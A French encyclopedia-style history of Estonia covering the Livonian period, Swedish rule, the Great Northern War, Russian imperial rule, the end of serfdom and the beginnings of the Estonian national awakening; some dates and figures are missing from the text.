La condition de la paysannerie va progressivement se dégrader du au . Les modes de culture progressent avec l'adoption de l'assolement triennal mais l'outillage agricole reste inchangé. Le nombre et le pouvoir des grands propriétaires terriens (les "mõisnik"), majoritairement d'origine germanophone, augmentent progressivement dans les campagnes : ils accaparent les terres tout en multipliant les servitudes féodales. Les commerçants des villes maintiennent un monopole sur le commerce qui prive de sources de revenus la paysannerie des côtes et des îles. L'esclavage disparaît progressivement mais globalement le statut du paysan se dégrade. La paysannerie est subdivisée en plusieurs catégories : les petits vassaux ("maavabad"), sans doute descendants des anciens chefs locaux, exemptés de taxes féodales, les laboureurs qui forment le corps principal de la classe paysanne et les paysans sans terre et journaliers. Au apparaissent les "üsksjalad", propriétaires de lopins modestes. La condition des paysans a été fixée au moment de la conquête par des accords qui préservent certains des droits des indigènes, notamment leur présence dans les instances judiciaires. Le statut accordé est plus favorable dans l'île de Saaremaa, prompte à la révolte, que dans les premiers territoires conquis au sud de l'Estonie actuelle. Mais progressivement les corvées et surtout la dîme, due au pouvoir ecclésiastique, vont s'alourdir jusqu'à provoquer la révolte paysanne dite « de la Saint-Georges » en 1343-1345, qui constitue aujourd'hui un des mythes fondateurs de l'Estonie. Cette révolte éclate, semble-t-il, de manière spontanée dans la région de Tallinn où les grands propriétaires fonciers, moins contrôlés par leur suzerain danois, font peser un fardeau particulièrement lourd sur la paysannerie. Les insurgés brûlent les manoirs et les églises, massacrent les propriétaires puis mettent le siège devant Tallinn en appelant à l'aide les Suédois et les Russes de Pskov. Ces derniers interviennent trop tard, alors que le gros de la révolte a déjà été écrasé. Une dernière flambée de révolte éclate à Saaremaa qui n'est reprise par les chevaliers Porte-Glaive qu'au printemps 1345. L'échec de la révolte est suivi de la poursuite de la dégradation du statut des paysans qui va conduire à l'apparition du servage à la fin du . Pour échapper à une condition de plus en plus misérable, certains paysans quittent la campagne et s'installent dans les villes, ou fuient vers les pays voisins.
Une situation de conflit permanent avec la Lituanie et la Russie.
Durant toute l'existence de la Livonie, les chevaliers sont périodiquement en conflit avec la Lituanie et les principautés russes car, animés par l'esprit des croisades, ils n'ont pas renoncé à convertir à la foi catholique les populations païennes ou schismatiques (orthodoxes). Mais les États qu'ils affrontent, mieux organisés que les populations indigènes qu'ils ont pu vaincre par le passé, vont résister et progressivement prendre le dessus. Heureusement pour les chevaliers l'invasion du territoire russe par la Horde d'or, à compter de 1237, monopolise le gros des forces russes sur un autre front durant une grande partie de la période. Toutefois ces guerres incessantes affaiblissent progressivement l'État livonien d'autant que, pour réduire les risques d'une révolte, les chevaliers interdisent le port des armes aux paysans estoniens, ce qui limite les forces que les chevaliers peuvent mobiliser. Les chevaliers de l'ordre ne sont que quelques centaines et, ayant fait vœu de célibat, doivent régulièrement reconstituer leurs effectifs qu'ils ont beaucoup de mal à recruter en terre allemande.
En 1236 les chevaliers sont sévèrement battus par les Lituaniens à la bataille de Saule (1236). La défaite à la bataille du lac Peïpous (1242) des chevaliers teutoniques assistés de forces auxiliaires estoniennes, face aux armées d'Alexandre Nevski, prince de la principauté de Novgorod, fixe pour des siècles la frontière entre catholicisme et orthodoxie. Les forces lituaniennes parviennent à pénétrer à plusieurs reprises (1260, 1263, 1270) en profondeur dans le territoire livonien qui à chaque fois est pillé. Les combats sont également incessants avec les principautés russes qui n'acceptent pas la présence des Allemands sur les côtes de la Baltique, qui s'imposent comme intermédiaires dans leurs échanges commerciaux avec l'extérieur. Les Russes parviennent parfois à pénétrer en profondeur en Livonie comme en 1323 où seule la forteresse de Tallinn résistera à leur assaut. En 1481, après un raid de l'ordre sur le territoire russe, le grand-duc Ivan III de Russie), désormais suzerain de la principauté de Novgorod, envahit la Livonie et la pille durant un mois sans rencontrer de résistance. Il fait édifier la forteresse d'Ivangorod en face du château de Narva. En 1494 il fait fermer le comptoir hanséatique de Novgorod et jeter en prison les commerçants livoniens. En 1501, devant la menace russe, les chevaliers s'allient aux lituaniens et parviennent à battre leur ennemi près de Pskov ce qui leur procure un dernier répit d'environ .
Les guerres de Livonie (1558-1710).
Durant cette période qui va de 1558 à 1770 les conflits, qui aboutissent à l'éclatement de la Confédération livonienne, occupent pour de paix et ravagent la région. Les élites locales perdent leur pouvoir politique au profit des grands états voisins qui montent en puissance. Ces bouleversements se superposent avec des changements importants au sein de la société : l'implantation du protestantisme, les premiers écrits en estonien et la fondation de la première université.
Le démantèlement de la Livonie (1558-1561).
En 1539 la Livonie expulse les marchands russes de ses villes. Les guildes cherchent ainsi à lutter contre le déclin de leur activité en instituant un monopole sur les routes commerciales qui passent par la région et mettent en communication la Russie, complètement enclavée, à l'Europe occidentale. Mais en 1547 Ivan IV le Terrible monte sur le trône à Moscou avec la volonté de renforcer le pouvoir de la Russie et d'étendre son territoire. Sa victoire sur les Tatars qui avaient longtemps tenu le pays sous leur joug est complète avec la prise de Kazan en 1552 et d'Astrakhan en 1556 et permet à l'armée russe en 1558 de prendre l'offensive dans le Nord et d'envahir la Livonie sous prétexte de dettes impayées ; Narva puis Tartu sont conquises. L'armée livonienne attaque alors Pskov ce qui permet d'obtenir une trêve. Les combats reprennent en 1560 : l'ordre livonien, dirigé par son grand-maître Gotthard Kettler, subit une défaite décisive à Hârgmäe près de Viljandi. En septembre de la même année, une révolte paysanne, la première depuis celle de la Saint-Georges, se produit dans le Hrjumaa et le Läänema mais est réprimée au cours de l'hiver. Kettler demande l'aide de la république des Deux Nations (union de la Lituanie et de la Pologne), dirigée alors par Sigismond II Auguste, pour combattre l'envahisseur russe, tandis que la bourgeoisie d'Estlande (Nord de l'actuelle Estonie) se tourne vers le roi de Suède Éric XIV (de Suède). Celui-ci débarque en revendiquant les anciennes possessions danoises sur le continent et chasse les Polono-lituaniens de Toompea. En novembre 1561, le traité de Vilnius entérine la partition de la Confédération livonienne : l'évêché de Saare-Lääne revient au royaume de Danemark, la région de Tallinn devient suédoise, tandis que le sud de la Livonie est rattaché à la Pologne-Lituanie. Cette dernière crée deux duchés sur ce nouveau territoire : la Livonie est à cheval sur la frontière sud de l'Estonie moderne et a pour chef-lieu Riga ; la Courlande ("Kurzeme") correspond au sud de la Lettonie actuelle. Le maître de l'ordre de Livonie, qui est dissous, prend la tête du duché de Courlande. Les Russes conservent provisoirement Tartu et Viljandi avant de les rendre aux polonais.
La montée en puissance de la Suède (1563-1661).
Les combats reprennent peu après (1563) entre d'une part la Suède et d'autre part le Danemark allié à la Pologne-Lituanie. La paix de Stettin en 1570 permet à la Suède de récupérer l'évêché de Saare-Lääne. Jusqu'en 1917 le territoire ainsi agrandi détenu par la Suède est connu sous le nom d'Estlande ou sous le nom générique d'Estonie. Les combats reprennent la même année entre la Suède et la Russie. Les Russes parviennent à plusieurs reprises à envahir le territoire occupé par les Suédois mais échouent devant Tallinn malgré deux sièges en 1570-1571 et 1577. La république des Deux Nations, gouvernée à partir de 1576 par Stefan Bathory, s'attaque aux armées russes tandis que le général Pontus de la Gardie, mercenaire au service de la Suède, parvient à chasser définitivement les Russes. Par la paix de Iam Zapolsk (1582) Ivan le Terrible reconnaît la défaite de ses troupes et les droits de la république des Deux Nations sur la Livonie. La guerre reprend entre Russes et Suédois en 1590. La Russie, qui est en proie au chaos depuis la mort d'Ivan le Terrible, doit reconnaître par le traité de Täyssinä (1595) les droits de la Suède sur l'Estlande. Cet accord sera confirmé par le traité de Stolbovo signé en 1617 par le nouveau souverain russe Michel de Russie. La Suède et la république des Deux Nations, après une trêve qui dure jusqu'en 1600, reprennent les armes. La noblesse germanophone de la Livonie, qui a été en partie dépouillée de ses biens par le nouvel occupant, prend le parti de la Suède. Après des combats indécis entrecoupés d'armistices les armées suédoises prennent le dessus. Au terme du traité d'Altmark (1629) signé entre les deux belligérants, pratiquement toute la Livonie passe sous le contrôle de la Suède. La Courlande reste polono-lituanienne. En 1643 un nouveau conflit permet à la Suède victorieuse de récupérer l'île de Saaremaa par le traité de Brömsebro (1645). La première guerre du Nord éclate entre la Suède et la république des Deux Nations en 1656 et se déroule en grande partie sur le territoire de l'actuelle Estonie. La Suède, qui l'emporte, voit confirmer par des traités signés en 1660 (traité de paix d'Oliwara avec la Pologne Lituanie) et 1661 (traité de paix de Kärde avec la Russie) son hégémonie sur les territoires qu'elle détient sur la rive sud de la Baltique, y compris l'Ingrie et l'emplacement de la future capitale russe Saint-Pétersbourg.
L'ère suédoise (1595-1710).
Les divisions administratives.
Le territoire de l'Estonie est désormais pratiquement entièrement contrôlé par le royaume scandinave et pour la première fois placé sous le contrôle d'un pouvoir politique unique. Sur le plan administratif, la région est découpée en trois entités aux statuts très différents : au nord le duché d'Estlande a pour capitale Tallinn et comprend 4 des anciens comtés. Narva est détaché de cet ensemble et devient la capitale de l'Ingrie. La province de Livonie au sud a pour capitale Tartu puis Riga et comprend 4 régions dont deux Tartu et Pärnu rassemblant les locuteurs estoniens (désignés par le terme d'Esthen), les deux régions du sud qui rassemblent les locuteurs lettons se situant sur ce qui constitue aujourd'hui le territoire de la Lettonie. Enfin l'île de Saaremaa constitue une troisième entité tantôt gouvernorat, tantôt possession personnelle du roi de Suède.
Croissance démographique et immigrations.
Vers 1640, la population, victime des conflits quasi permanents ainsi que de la famine et des épidémies qui les accompagnent, compte de nouveau moins de . La reprise démographique est rapide et vers 1690 on dénombre entre et sur le territoire correspondant à l'Estonie moderne soit 10 % de la population du royaume de Suède. Cet accroissement de la population est en partie lié à l'arrivée d'immigrants qui viennent repeupler les territoires vidés par les différents conflits et répondent ainsi parfois à l'appel des autorités. Ils viennent de Finlande, Russie, Courlande et de Lituanie. En général les nouveaux venus finissent par se fondre dans la paysannerie estonienne. Toutefois une communauté de Russes orthodoxes vieux-croyants, pourchassés pour leur croyance dans leur pays, vient coloniser les rives du lac Peïpous et conservera jusqu'à aujourd'hui sa langue et sa culture. Des commerçants et artisans russes s'installent dans les villes. La croissance démographique est interrompue par le petit âge glaciaire qui débute à cette époque et provoque une dégradation climatique catastrophique en 1695-1697 : des pluies diluviennes et un froid persistant entraînent une famine accompagnée d'épidémies de typhus et de dysenterie qui fait périr 20 % de la population.
Le nouveau pouvoir des barons allemands.
Le pouvoir de la classe dominante allemande ethnique, descendante de l'ordre de Livonie, sort fortement renforcé de cette série de conflits. Ceux qu'on appelle désormais les barons baltes allemands (en allemand ils se désignent par le terme de "Balten" « Baltes » ou "Deutschbalten" « Baltes allemands » ou "Balstischer Adel" « noblesse balte » pour se distinguer des Allemands roturiers), reçoivent la récompense de leur soutien à la Suède avec des variantes selon les régions administratives : très favorable en Estlande qui s'est ralliée très tôt à la couronne suédoise, un peu moins à Saaremaa ou les terres confisquées sont en partie conservées par la couronne suédoise et en Livonie intégrée plus tardivement. Dans ces trois régions la noblesse balte-allemande bénéficie d'un statut juridique privilégié et d'un ordre de chevalerie ("Ritterschaft") dans les différentes provinces ; les affaires courantes sont désormais gérées par des conseillers territoriaux ("Landräte") choisis parmi les barons baltes. Les représentants forment une diète régionale qui se réunit tous les trois ans, à Reval pour l'Estlande, et Riga pour la Livonie. Les pouvoirs du gouverneur suédois sont essentiellement fiscaux et militaires. Les lois suédoises n'ont pas cours. Les institutions mises en place, qui donnent les pleins pouvoirs aux barons baltes, se maintiendront jusqu'à la fin du .
Dégradation de la condition des paysans et stagnation des villes.
Malgré l'absence d'évolution des pratiques agricoles, les provinces baltes contribuent à approvisionner Stockholm, ce qui leur vaut le surnom de « grenier de la Suède ». Le nombre des "mõisad", ces grands propriétaires terriens généralement germanophones, atteint le millier sur le territoire de l'Estonie et, grâce aux pouvoirs accrus accordés à la noblesse balte, ceux-ci s'approprient de nouvelles terres agricoles en expulsant ou asservissant les paysans jusque-là propriétaires. La concentration des terres entraîne la disparition de villages et aboutit à un habitat rural dispersé. Le statut de la majorité des paysans est modifié par des règlements édictés en 1645 en Estlande et en 1671 et 1688 en Livonie : le paysan est désormais un serf attaché à la terre de manière héréditaire qui peut être vendu avec la propriété agricole ; les châtiments corporels se généralisent. La justice seigneuriale s'impose face à une administration suédoise embryonnaire. La fiscalité s'accroît : 50 à 80 % des revenus des paysans reviennent à la noblesse locale et à la couronne. Malgré cette dégradation de la condition paysanne, les révoltes sont de faible ampleur. Le pouvoir suédois va toutefois intervenir à compter des années 1670 pour tenter de freiner et d'inverser cette évolution du statut du paysan.
Les villes de l'Estonie ont du mal à se remettre des conflits dont elles ont souvent été victimes car le territoire estonien est désormais à l'écart des principaux courants commerciaux. La population urbaine ne regroupe que 6 % de la population totale en 1700. La plus grande ville est Tallinn qui avec est la troisième cité du royaume suédois après Stockholm et Riga, mais la plus dynamique est Narva qui devient le principal centre commercial du golfe de Finlande. Les premières manufactures industrielles s'installent à Narva et Tallinn.
Alphabétisation des campagnes et influence culturelle allemande.
Les églises continuent de jouer un rôle majeur dans l'évolution culturelle. Le pouvoir suédois s'intéresse de près à la promotion du protestantisme dans cette région à la limite des terres catholiques (Lituanie) et orthodoxes (Russie). Les deux évêchés, Tallinn et Riga, qui subsistent sur le territoire après une réorganisation menée par les nouveaux dirigeants, reçoivent durant cette période des titulaires suédois à deux exceptions près. La république des Deux Nations avait tenté, lorsqu'elle détenait la Livonie (1561-1629), de ramener au catholicisme la population convertie à l'église Réformée : les jésuites, acteurs principaux de la Contre-Réforme, avaient alors fondé en 1583 à Tartu une école de traducteurs et un établissement d'enseignement secondaire puis en 1595 un collège d'enseignement supérieur chargé de former les prêtres et les cadres administratifs. Après la prise de la ville par les Suédois en 1625, les jésuites sont expulsés et l'école est mise au service du clergé luthérien. Le souverain suédois Gustave II Adolphe élève en 1632 le collège de Tartu au rang d'université. Il s'agit à l'époque de la deuxième université de Suède après celle d'Uppsala. Jusqu'à sa dissolution par la Russie en 1710, elle fonctionnera de manière discontinue du fait des conflits militaires et des problèmes financiers et formera en tout , futurs pasteurs et juristes, surtout suédois et germanophones. À cette époque la langue estonienne se métisse d'allemand. La structure de la phrase se calque sur celle de cette langue. Les verbes à particule séparable font leur apparition à l'image de ce qui existe dans les langues germaniques. Au terme de ce processus, environ 15 à 20 % du vocabulaire est emprunté à l'allemand.
Les réformes de Charles XI.
Le roi suédois Charles XI (de Suède), parvenu au pouvoir en 1660, veut établir un État fort sur le modèle de l'État français. Dans ses possessions baltes cette nouvelle politique se traduit par le renforcement du pouvoir royal au détriment des élites allemandes ethniques et par un allégement de la condition des paysans afin d'éviter les révoltes. À partir de 1680 le pouvoir suédois s'approprie tous les domaines dont les maîtres allemands n'ont pas de titre de propriété en bonne et due forme ("Güterreduktion"), comme cela a été fait en Suède auparavant. Les confiscations sont plus importantes en Livonie ; sur l'ensemble du territoire 54 % des biens des mõisad sont rattachés à la couronne suédoise, mais contrairement à la Suède, on laisse aux anciens propriétaires l'usage de leurs terres. Sur les terres confisquées, les pasteurs autrefois nommés par la noblesse sont désormais désignés par les représentants du souverain suédois. Le servage y est aboli par des décrets passés en 1681 et 1687. Les paysans prennent désormais part aux conseils provinciaux et peuvent demander justice devant des tribunaux royaux. Face à toutes ces mesures, les élites germanophones, qui sentent leur pouvoir menacé pour la première fois dans leur histoire, protestent vigoureusement jusqu'à déclencher la dissolution de la diète de la Livonie par le pouvoir royal en 1694. Charles XII, qui monte sur le trône de Suède en 1697 alors qu'il n'est encore qu'un adolescent, tente en vain d'apaiser la noblesse en revenant sur certaines des mesures prises par son père.
La grande guerre du Nord (1700-1721).
Pierre le Grand, tsar de Russie depuis 1682, a de grandes ambitions pour son pays qu'il veut moderniser en l'ouvrant vers l'Europe occidentale. La réalisation de son dessein nécessite de disposer d'une « fenêtre » sur les côtes de la Baltique, qui sont à l'époque entièrement aux mains de la couronne suédoise. Il va profiter de la position affaiblie de la Suède dans les pays baltes. La Russie se joint à une alliance passée entre la république des Deux Nations, le Danemark et la Saxe contre la Suède en 1699. Ce pacte est en grande partie le résultat des intrigues du maréchal de camp balte Johann Reinhold von Patkul ; cet ancien porte-parole de la diète de Livonie est devenu celui des opposants aux réformes en 1692 avant de passer dans le camp de la Pologne-Lituanie. La grande guerre du Nord éclate en février 1700. Les troupes saxonnes et polono-lituaniennes pénètrent sur le territoire des pays baltes par le sud mais échouent devant Riga, tandis que le roi de Suède inflige une défaite cinglante aux troupes russes à Narva. Le corps d'armée principal suédois dirigé par Charles XII, négligeant de poursuivre son avantage contre l'armée russe, s'enfonce en Pologne, ce qui permet aux troupes russes d'occuper l'Ingrie puis, en 1701 et 1702, de ravager la Livonie et l'Estlande gardées par un mince rideau de troupes. Les Russes parviennent à s'emparer de Tartu et de Narva. Le souverain suédois, après avoir vaincu ses ennemis à l'ouest et leur avoir imposé des traités de paix, se retourne en 1706 contre les Russes avec lesquels un armistice avait été signé entretemps. Mais il est complètement défait à la bataille de Poltava en Ukraine (1709), ce qui permet aux troupes russes de parachever leur conquête des bords de la Baltique en 1710, puis d'occuper une partie de la Finlande qui est à l'époque une possession suédoise. Le conflit s'achève en 1721 avec le traité de Nystad qui entérine l'annexion de la Livonie et de l'Estlande par la Russie. Celle-ci est désormais installée dans le rôle de puissance dominante de la région au détriment de la Suède. Dès 1703, Pierre le Grand lance les travaux de la nouvelle capitale de l'Empire, Saint-Pétersbourg, qui reflète le rôle majeur que joue désormais la région pour les dirigeants russes.
L'Estonie dans l'Empire russe (1710-1917).
Le renforcement du pouvoir de la noblesse germano-balte.
Les nouveaux dirigeants russes n'introduisent aucun bouleversement dans la région. La noblesse germanophone, qui a accueilli favorablement le changement de suzerain, retrouve la position qu'elle détenait avant les interventions des deux derniers souverains suédois : dès 1710 les privilèges des diètes de Livonie et d'Estlande sont ainsi restaurés et les biens confisqués par la couronne suédoise sont restitués aux allemands. Par la suite, tous les tsars jusqu'à Alexandre II confirment ces droits et la gestion des provinces est entièrement confiée aux barons baltes-allemands, qui, en échange font preuve d'un loyalisme sans faille envers le pouvoir russe. La noblesse fournit aux souverains russes de nombreux serviteurs de rang élevé ; à compter de Pierre le Grand, l'élite intellectuelle et militaire est d'ailleurs souvent d'origine germanique. Sur les plans religieux et linguistique, les autorités russes n'interfèrent pas avec les pratiques locales, contrairement à ce qui se passe dans le reste de l'Empire. Le cadre administratif est légèrement modifié : les provinces de Livonie et d'Estlande sont chacune divisées en quatre districts. Saaremaa est désormais un des districts de la Livonie. Le pouvoir russe désigne les deux gouverneurs des régions, généralement des Russes, qui traitent essentiellement des affaires militaires, ainsi que les responsables des douanes et les percepteurs d'impôt. Le reste de l'administration est entre les mains des barons allemands. La langue de l'administration et de la justice est l'allemand, tandis que celle de l'armée et des douanes est le russe. Les provinces baltes-allemandes sont protégés par une barrière douanière du reste de l'Empire et disposent de leur propre monnaie, le Thaler.
La condition de la paysannerie au.
Profitant de l'autonomie accordée par le pouvoir russe, la noblesse allemande renforce son emprise sur les terres agricoles. Les mõisad, contrôlés à près de 90 % par cette petite caste qui rassemble environ , soit 1 % de la population, détiennent 81 % des terres cultivables en Livonie en 1758 et 95 % en Estlande en 1774. Durant la même période, la part de ces terres exploitées par des fermiers estoniens installés de manière permanente diminue au profit de celles travaillées par de simples ouvriers agricoles. Comme dans l'ensemble de l'Europe orientale, la condition des paysans se dégrade et, vers 1780, le servage concerne près de 96 % des paysans estoniens. Catherine II monte sur le trône russe en 1762 avec la volonté de moderniser son empire. Tout en étant sensible aux idées du siècle des Lumières, elle veut mettre en place un État fort et centralisé. Dans les provinces baltes, qu'elle visite longuement en 1764, elle cherche à limiter le pouvoir de la classe dirigeante germano-balte. L'année suivante, elle impose aux diètes une série de réformes destinées à limiter le pouvoir des gros propriétaires fonciers sur leurs paysans tout en reconnaissant à ceux-ci certains droits. Mais l'impact des mesures est faible du fait de la résistance passive des possédants et de l'imprécision des textes. Toutefois Catherine II réussit à mettre sur pied un réseau relativement dense d'écoles : en 1787 il y en a 223 en Estlande et 275 en Livonie du Nord. À la même époque, l'implantation d'un demi-million de paysans allemands dans la région est envisagée mais ceux-ci, faute de terres disponibles et face à la résistance de la noblesse germano-balte, sont finalement installés sur les rives de la Volga.
Un nouveau train de réformes est engagé par les autorités russes dans les années 1780, supprimant certains particularismes de la région : les barrières douanières entre celle-ci et la Russie sont supprimées, le thaler est remplacé par le rouble et les habitants sont désormais soumis à l'impôt commun, la capitation russe. Les effectifs de l'appareil administratif augmentent fortement et se russifient. Le découpage de la province est remanié et un seul gouverneur, siégeant à Riga, dirige à la fois l'Estlande et la Livonie. Les propriétaires, même non nobles, peuvent désormais siéger dans les diètes et dans les conseils municipaux. Des tribunaux qui traitent les affaires concernant les paysans sont créés à côté de ceux dédiés d'une part aux bourgeois et d'autre part aux nobles. Enfin une réglementation met des limites aux pouvoirs dont la noblesse dispose vis-à-vis de ses serfs.
L'influence du mouvement piétiste.
Au début des années 1700 la prédication des frères moraves, mouvement piétiste fondé en Bohême par le comte Nikolaus Ludwig von Zinzendorf, s'implante sur le territoire estonien. Ce mouvement religieux issu du luthéranisme met l'accent sur l'approfondissement de la spiritualité personnelle. Il se répand d'autant plus facilement que l'Empire russe se désintéresse des croyances religieuses de ses sujets non orthodoxes et que la hiérarchie religieuse luthérienne ne s'est pas relevée de la disparition de sa tutelle suédoise. Entre 1710 et 1740 le mouvement piétiste prend le contrôle de l'ensemble des paroisses d'Estlande et de Livonie. Le piétisme impose la lecture de la Bible au moins une fois par an. Cette nouvelle pratique nécessite donc la maîtrise de la lecture par les paroissiens et la mise à disposition d'ouvrages religieux dans leur langue. Les frères moraves vont former un réseau d'enseignants très efficace : vers 1790, entre la moitié et les trois quarts des Estoniens savent lire. Parallèlement, la traduction de la Bible en estonien du Nord est entreprise et s'achève en 1739 ; elle nécessite l'invention de nombreux mots estoniens pour désigner des concepts abstraits et pose les bases de l'estonien moderne ; l'estonien du Nord qui bénéficie de la diffusion de cet ouvrage prestigieux prend définitivement l'ascendant sur l'estonien du Sud jusque-là dominant. En 1743, la diète de Livonie interdit la prédication morave qui menace par son égalitarisme l'ordre établi. L'interdiction est levée en 1764 mais entre-temps le mouvement religieux, en proie à des dissensions internes, s'est affaibli. Toutefois, l'influence de son enseignement persiste comme l'égalitarisme qui permettra l'implantation rapide des idées démocratiques, le puritanisme, ainsi que l'habitude de chanter dans des chorales. La majorité des acteurs du mouvement national estonien du seront issus de familles de prédicateurs moraves, tout en récusant un mouvement auquel ils reprochent, à juste titre, d'avoir tenté de faire disparaître les traditions séculaires estoniennes aux relents de paganisme.
Les Estophiles: influence du libéralisme allemand sur les Germano-baltes.
De petits ouvrages traitant de thèmes non religieux commencent à se diffuser au début du , notamment des almanachs mêlant conseils pratiques, nouvelles de l'Empire et textes édifiants. Des recueils de contes et récits sont traduits de l'allemand et vont passer en partie dans la tradition orale estonienne. Mais l'essentiel de la vie culturelle se déroule en allemand. Malgré l'éloignement des grands centres culturels où se pratique cette langue, les idées de l’"Aufklärung", l'équivalent germanique du mouvement des Lumières et qui a pris naissance dans les années 1740, touche les pays baltes grâce aux intellectuels allemands venus enseigner ou travailler dans la région. Notamment Johann Gottfried von Herder, un des pères fondateurs du relativisme culturel, enseigne à Riga entre 1764 et 1769. Il s'intéresse aux peuples baltes en lesquels il voit des nations en puissance nullement inférieures à la nation allemande. Dans son recueil de chants populaires "Stimmen der Völker in Liedern" (Les voix des peuples à travers leurs chants), il inclut huit airs estoniens. Dans son sillage, un certain nombre de germanophones de la génération suivante s'intéressent aux peuples de la région et publient des essais, comme le Germano-Balte Garlieb Helwig Merkel qui dans son ouvrage publié en 1796 suggère pour la première fois que ces peuples autochtones ont été privés de leur développement naturel par la conquête allemande, et qui le premier idéalise la société qui a précédé les croisades baltes.
Les lumières et l'abolition du servage (1802-1830).
Les idées de la Révolution française de 1789 impulsent partout en Europe un vent de réforme. Face aux nationalismes romantiques naissants en Allemagne, le tsar Paul craint une perte d'allégeance des Baltes-allemands envers le pouvoir russe, et tente de limiter les échanges culturels des nobles allemands avec le pays de leurs ancêtres. Il interdit aux héritiers de familles nobles de partir étudier en Allemagne, mais accepte en contrepartie de rouvrir une université locale. La montée sur le trône russe en 1801 d'Alexandre, un souverain plus ouvert que son père, transforme finalement l'Université de Dorpat (Tartu) en véritable foyer de diffusion des idées des lumières. Avec l'aide du physicien franco-allemand Georges Frédéric Parrot, proche ami du Tsar, un grand nombre de professeurs et de chercheurs venus d'Europe centrale et occidentale quittent leurs pays d'origine en raison de l'instabilité générée par les guerres napoléoniennes et viennent travailler à l'Université.
Peu auparavant, la Courlande est annexée par la Russie à la suite du troisième partage de la Pologne (1795). Elle est regroupée avec l'Estlande et la Livonie dans un ensemble baptisé du nom germanique de "Baltikum" qui est dirigé à compter de 1801 par un gouverneur russe unique installé à Tallinn. La noblesse terrienne balte est sensible aux arguments des physiocrates et Jakob Georg von Berg, propriétaire foncier éclairé, fait adopter en 1802 par la diète d'Estlande un texte instituant une réforme fondamentale du statut des paysans. Le pouvoir russe a contribué à cette évolution en accordant des facilités financières aux propriétaires fonciers souvent très endettés. Le texte adopté reconnaît au paysan l'usufruit héréditaire et perpétuel des terres qu'il cultive dans la mesure où il s'acquitte des obligations féodales envers son maître. Il crée à l'échelon du "vald" (commune) des tribunaux locaux dans lesquels siègent trois juges (un représentant des propriétaires et deux représentants des paysans). La diète d'Estlande adopte en 1804 un texte encore plus libéral définissant un barème des obligations des paysans sur une base objective.
Mais les textes libérant véritablement la paysannerie du servage ne sont adoptés qu'en 1816 pour l'Estlande et en 1819 pour la Livonie. Ces lois instituent des assemblées paysannes au niveau des vallads élues par la petite minorité de paysans qui a pu accéder à la propriété ; l'assemblée est chargée de régir les relations de l'ensemble de la communauté paysanne avec la noblesse foncière (contrats de fermage) et avec l'État (impôt, conscription militaire) ainsi que de gérer notamment l'école et l'assistance aux démunis. Conséquence de la fin du servage, les Estoniens, qui jusque-là étaient désignés par le nom de la ferme dans laquelle ils travaillaient, reçoivent un nom de famille souvent à consonance allemande. Une période de transition d'une dizaine d'années est prévue, et c'est seulement vers 1830 que les paysans obtiennent le droit de quitter la terre qu'ils travaillent pour s'installer ailleurs. La noblesse terrienne conserve un pouvoir important : c'est elle qui convoque les assemblées, en contrôle les comptes ; elle est toujours autorisée à appliquer des châtiments corporels lorsque les contrats ne sont pas respectés. Mais le mécontentement de la paysannerie persiste car la terre est toujours la propriété de la noblesse foncière et les conditions des contrats de fermage, souvent plus courts, se sont plutôt durcies. Les paysans tentent de profiter de leur liberté pour aller voir ailleurs, notamment en Russie où ils sont autorisés à se déplacer à compter de 1863. En 1845-1848, paysans, persuadés à tort que le tsar accordera des terres à ses sujets orthodoxes, se convertissent à cette religion. S'étant rendu compte de leur erreur, ils ne sont pas autorisés à revenir à leur ancienne foi et donnent ainsi naissance à une minorité religieuse qui s'est perpétuée jusqu'à aujourd'hui. Une réforme agraire, définie par des représentants de la noblesse terrienne libérale et des représentants du tsar, est promulguée en 1849 et appliquée entre 1856 et 1865 : elle permet aux fermiers de racheter leurs terres mais peu en profitent car les conditions ne sont pas avantageuses. Le mécontentement de la paysannerie est à l'origine de nombreux incidents ; le plus célèbre est la "guerre de Mahtra" (1858), qui voit la troupe tirer sur la foule venue manifester : 10 paysans sont tués et 60 condamnations à mort sont prononcées mais elles seront converties en peines de knout ou de déportation en Sibérie.
L'éveil national estonien au.
L'éveil du sentiment national estonien est un processus très graduel qui se déroule tout au long du . Durant la première moitié de ce siècle, la question de l'identité nationale est absente des préoccupations de la plupart des estoniens. Il n'y a alors ni classe moyenne ni vie intellectuelle proprement estonienne ; la culture germanique constitue la référence tandis que les questions du servage et de l'accès à la propriété foncière monopolisent les combats des indigènes : les paysans estoniens sont d'ailleurs prêts à émigrer ou à se convertir à une foi étrangère pour améliorer leur sort. L'impulsion initiale vient paradoxalement des Germano-Baltes. La réouverture en 1802 de l'université de Tartu (Dorpat à l'époque), fermée depuis 1711, va contribuer au développement du courant estophile.
Les cours sont exclusivement en allemand jusqu'en 1889, quoiqu'une chaire d'estonien, destinée essentiellement aux futurs pasteurs luthériens, est créée en 1803. L'université, qui accueille entre 600 et et au milieu du , comprend des facultés de sciences, d'histoire et de lettres, de droit, de médecine et de théologie. Les enseignants sont initialement d'origine allemande, mais à partir de 1841, le corps professoral est exclusivement d'origine locale c'est-à-dire germano-balte. Ce foyer intellectuel va accentuer l'influence culturelle allemande, ce qui, de manière paradoxale, va favoriser l'émergence du mouvement national estonien. Le début du est en Allemagne la grande époque du romantisme qui se traduit notamment par un intérêt croissant pour les traditions et les langues locales. C'est ainsi qu'un petit cercle d'intellectuels, essentiellement germanophones, va se consacrer à l'étude du milieu estonien. Le pasteur Johann Heinrich Rosenplänter publie entre 1813 et 1832 une revue savante à diffusion restreinte, rassemblant des articles sur la linguistique, l'histoire, la mythologie et le folklore estoniens. En 1836 paraît le journal "Das Inland" (« Le pays d'ici » en allemand) qui consacre une partie de ses pages au même sujet. En 1838 est fondée à Tartu la "Société savante estonienne" ("Gelehrte Esthnische Gesellschaft"). Enfin la "Société littéraire estonienne" ("Esthnische Literarische Gesellschat") est créée en 1842 à Tallinn. Cet intérêt pour la culture estonienne se conjugue avec la volonté d'améliorer la condition du paysan estonien : des ouvrages d'éducation populaire touchant l'hygiène, l'agronomie, la lutte contre l'alcoolisme sont publiés. Mais beaucoup d'estophiles sont persuadés que les Estoniens, une fois mis sur la voie du progrès, vont à terme se germaniser comme les peuples de la Prusse : leur propre rôle est d'être les vecteurs de la civilisation, de faciliter la transition et de recueillir un patrimoine culturel appelé à disparaître.
